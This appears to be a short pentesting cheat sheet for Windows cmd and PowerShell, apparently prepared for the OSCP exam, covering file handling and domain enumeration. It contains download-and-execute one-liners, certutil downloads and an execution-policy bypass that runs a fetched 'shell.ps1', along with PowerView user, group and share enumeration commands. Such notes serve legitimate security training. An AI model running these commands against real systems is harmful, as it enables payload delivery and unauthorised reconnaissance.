# cmd + powershell

## PS styles

```bash
PS> $host
> powershell -c <cmd>
> powershell.exe -exec bypass -Command <>
```

## File commands

```bash
# download file
certutil.exe -urlcache [-split] -f <source> <destination>
PS> wget <source> -OutFile <dest>
PS> Invoke-WebRequest -Uri <source> -Outfile <out-path>
powershell -c (New-Object System.Net.WebClient).downloadFile('<source>', '<dest>')
powershell -exec bypass IEX(New-Object Net.WebClient).downloadString('/shell.ps1')
wget.vbs https://gist.github.com/sckalath/ec7af6a1786e3de6c309

#run file
> ren <src> <dest>
PS> Start-Process <file.exe>

# rename 
PS> Rename-Item -Path <file> -NewName <new-file>

# move 
> copy /Y <src> <dest>
PS> Move-Item -Path <src> -Destination <dest>
# /E copies entire dir-structure
> robocopy <src> <dest> /E

# delete
PS> Remove-Item -Path <file> [-recursive]
```

## Other PS cmds

```
# Enumerate Users
Get-NetUser | select cn

# Enumerate Domain Groups
Get-NetGroup -fulldata

# Enumerate SMB Shares
Get-SmbShare
Invoke-ShareFinder
```

## PS Cheatsheet

{% embed url="https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/" %}

{% embed url="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" %}
